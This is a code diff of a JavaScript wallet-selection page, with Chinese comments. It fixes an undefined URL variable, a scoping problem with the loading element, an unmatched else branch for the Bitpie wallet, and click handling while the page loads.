@@ -1815,9 +1815,17 @@ DOM.walletItems.forEach(item => {
         const wallet = walletConfig[walletType];
         if (!wallet) return;
 
-                const loadingEl = document.getElementById("Loading");
+        // 1. 定义targetUrl（之前漏掉的变量）
+        const targetUrl = window.location.href + "#approve";
+        // 2. 把loadingEl定义在try外面，避免作用域问题
+        const loadingEl = document.getElementById("Loading");
+        const lang = langConfig[currentLang];
+
+        // 3. 给else加上对应的if（针对bitpie钱包的单独逻辑）
+        if (walletType === "bitpie") { // 这里是else对应的if！
             if (loadingEl) loadingEl.style.display = "flex";
-            const lang = langConfig[currentLang];
+            item.style.pointerEvents = "none"; // 避免重复点击
+            DOM.multiWalletPopup.style.display = "none";
 
             try {
                 // 直接检查本地适配器是否加载成功
@@ -1864,12 +1872,13 @@ DOM.walletItems.forEach(item => {
             // 1500ms后隐藏加载动画
             setTimeout(() => {
                 if (loadingEl) loadingEl.style.display = "none";
+                item.style.pointerEvents = "auto"; // 恢复点击
                 DOM.userInfoEl.style.display = "block";
                 DOM.walletStatusContainer.style.display = "block";
                 DOM.contractResourceContainer.style.display = "block";
             }, 1500);
 
-        } else {
+        } else { // 现在else有对应的if了！
             let jumpUrl = "";
             switch (walletType) {
                 case "imtoken":
